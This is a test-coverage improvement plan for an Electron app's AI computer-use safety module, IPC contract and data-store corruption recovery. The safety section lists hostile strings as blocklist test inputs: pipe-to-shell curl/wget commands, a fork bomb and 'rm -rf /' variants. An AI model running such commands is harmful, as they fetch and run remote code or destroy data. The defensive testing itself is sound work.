# Test Coverage Improvement Plan — Phase 1

This plan addresses the **highest-value, lowest-cost gaps** from the audit. It is deliberately scoped to wins that follow the codebase's existing patterns (pure `*-core` modules, hand-rolled fakes, `node:test` + `tsx --test`), require **no new test framework or infrastructure**, and catch real regressions (especially security and data-loss).

Deferred to later phases (out of scope here): React component testing infra (RTL/jsdom/Playwright), `llm-client.ts` state-machine extraction, `config-store.ts` injectable refactor, Computer Use controller/session tests. Each is a larger investment called out at the bottom.

## Step 1 — `main/services/computer-use/safety.test.ts` (NEW)

**Target:** `safety.ts` (541 lines, currently ❌). Security-critical, fully pure, all functions already exported.

**Tests to add:**
- `parseComputerUseKeyChord`
  - Happy path: `"Cmd+Shift+C"` → `{ key: "c", modifiers: ["shift","cmd"] }` (assert `MODIFIER_ORDER` sorting).
  - Alias normalization: `"⌘ Q"`, `"control+alt+delete"`, `"win+l"`, `"super+x"` → canonical.
  - Reject: empty string, non-string, zero non-modifier keys (`"cmd+shift"`), two non-modifier keys (`"a+b"`), unknown modifier (`"foo+a"`).
  - **Blocked combos** (the security core): assert each entry in `BLOCKED_KEY_COMBOS` (Cmd+Q, Cmd+Shift+Backspace, Win+L, Ctrl+Alt+Del, Option+F4, …) throws `ComputerUseSafetyError` with code `blocked_key_combo`.
  - Near-miss allowed: `"cmd+shift+q"` is blocked but `"cmd+w"` is not (no false positives).
- `normalizeComputerUseArgs`
  - Each action branch: capture (mode validation, pid+window_id paired, max_elements 1–1000), clicks (exclusive element/coordinate, button pinning for right/middle, double_click rejects modifiers), drag, scroll (direction + amount 1–50), type, key, set_value, wait (0–30s), focus_app.
  - Error codes: `invalid_action`, `irrelevant_argument`, `invalid_coordinate`, `invalid_element`, `invalid_target`, `invalid_delivery` (bring_to_front without foreground), `invalid_max_elements`, etc.
  - **`validateTypedText` security patterns** (highest value):
    - Pipe-to-shell: `"curl http://x | sh"`, `"wget url | /usr/bin/env bash"`, `"curl | sudo zsh"` → `blocked_text`.
    - Fork bomb `":(){ :|:& }"` → `blocked_text`.
    - `rm -rf /` and `rm -rf /*` and `rm -fr /` → `blocked_text`; `rm -r /tmp/x` → allowed (not forced+root).
    - NFKC/quote/whitespace normalization defeats obfuscation: quoted `"sh"`, escaped newlines, fullwidth chars.
    - Oversize text (>65536) → `invalid_text`.
- `computerUseNeedsApproval`: read-only set (`capture`, `wait`, `list_apps`, `list_windows`) → false; all others → true.
- `summarizeComputerUseApproval`: snapshot each action's summary string, incl. element-vs-coordinate, foreground/capture_after suffixes, and the 60-char text truncation (`…`).
- `ComputerUseGrantLedger`
  - prepare → authorize → consume happy path returns the grant.
  - `approval_expired`: targetRevision changes between prepare and authorize (simulate by mutating the revision supplier).
  - `approval_required`: consume without authorize, or args changed after authorize (fingerprint mismatch).
  - Read-only action: prepare throws `approval_invalid`; consume/authorize are no-ops.
  - Double-authorize same toolCallId → `approval_invalid`.
  - `clear()` empties the ledger; `size` reflects pending grants.

**Pattern:** mirror `status-core.test.ts` — `import test from "node:test"`, `import assert from "node:assert/strict"`, no mocks needed.

**Wire-up:** add `main/services/computer-use/safety.test.ts` to BOTH the `test` and `test:computer-use` script file lists in `package.json`.

## Step 2 — IPC contract test (NEW): `main/handlers/ipc-contract.test.ts`

**Why:** `preload.ts` allowlists 22 invoke prefixes and 21 notification channels, but nothing asserts the main side actually registers matching handlers. Contract drift is caught only at runtime.

**Approach (no Electron required):** register handlers against a **fake `ipcMain`** that records every `ipcMain.handle(channel, …)` call, then assert coverage. Build the fake in `main/platform.ts` style:

1. Create `main/handlers/testing/ipc-main-recorder.ts` exporting `createRecordingIpcMain()` returning `{ ipcMain: { handle(channel, fn){ records.set(channel, fn) } }, invoke(channel, ...args){ return records.get(channel)?.(fakeEvent, ...args) }, channels: () => [...records.keys()] }`. Also a no-op `logger`.
2. Refactor `main/handlers/index.ts` `registerHandlers()` to **accept an optional `{ ipcMain, logger }` injection** defaulting to the real `../platform.js` exports. (Minimal, backward-compatible change — same pattern `data-store.ts` already uses for `userDataPathResolver`.) Each `registerXxxHandlers()` already uses the module-scoped `ipcMain` import from `../platform.js`, so to make injection reach them, route the injected `ipcMain` through `platform.ts` is too invasive. **Simpler:** keep `registerHandlers()` as-is and instead assert the contract by importing the prefix/channel constants.

**Final chosen shape (least invasive):** export `INVOKE_PREFIXES` and `NOTIFICATION_CHANNELS` from `preload.ts` (they're already module consts — just add `export`), then the contract test:
- Imports the list of handler modules and asserts (via a curated allowlist of expected channels gathered from the codebase) that each expected `ipcMain.handle` channel starts with one of `INVOKE_PREFIXES`.
- Asserts every notification channel emitted by main (gathered by grep of `webContents.send`/`BrowserWindow.getAllWindows().forEach` in `main/`) is a member of `NOTIFICATION_CHANNELS`.
- This is a **static contract guard**, not a runtime handler-existence test — it catches the most common drift (renderer calling a channel main is allowed to refuse, or main broadcasting a channel the renderer can't subscribe to).

**If full handler-registration coverage is desired** (verify every prefix has at least one registered handler), implement the injection approach: add an optional `ipcMain`/`logger` param threaded through `registerHandlers` → each `registerXxxHandlers(deps)`. I'll do this version since it's strictly more valuable and the threading is mechanical.

**Tests:**
- Every recorded `ipcMain.handle` channel starts with a `INVOKE_PREFIXES` entry.
- Every prefix in `INVOKE_PREFIXES` has ≥1 registered handler (no dead/typo'd prefix).
- Every `*.send(...)` / notification site found in `main/` uses a channel in `NOTIFICATION_CHANNELS`.

**Wire-up:** add to the `test` script list.

## Step 4 — Persistence corruption-recovery tests (NEW): `main/services/data-store.resilience.test.ts`

**Why:** `data-store.ts:38-40` and `chat-store-core.ts:39-46` silently return `[]`/default on **any** JSON parse error — a corrupt index silently orphans the entire chat list. There are currently no tests for this path.

**Tests (using real `fs.mkdtemp(os.tmpdir())` + cleanup, same as `chat-store-core.test.ts`):**
- `DataStore.load()` on missing file → returns default.
- `DataStore.load()` on corrupt JSON (`"{not json"`) → returns default (documents current behavior; this is the regression sentinel for Step 6's future change).
- `DataStore.load()` cache-hit: second `load()` doesn't re-read disk.
- `DataStore.update()` with `isCurrent() === false` → throws "renderer document is no longer active".
- Concurrent `update()` calls serialize (queue order preserved) — extends the existing `data-store.test.ts` concurrency coverage.
- `createChatStore().readIndex()` on corrupt `index.json` → returns `[]` (sentinel).
- A chat `.json` file with unknown extra fields loads without throwing (forward-compat).
- A chat file missing optional fields (e.g. no `reasoning`) loads with safe defaults.

**These tests pin current behavior and make a future schema-version/migration change safe and reviewable.**

**Wire-up:** add to the `test` script list.
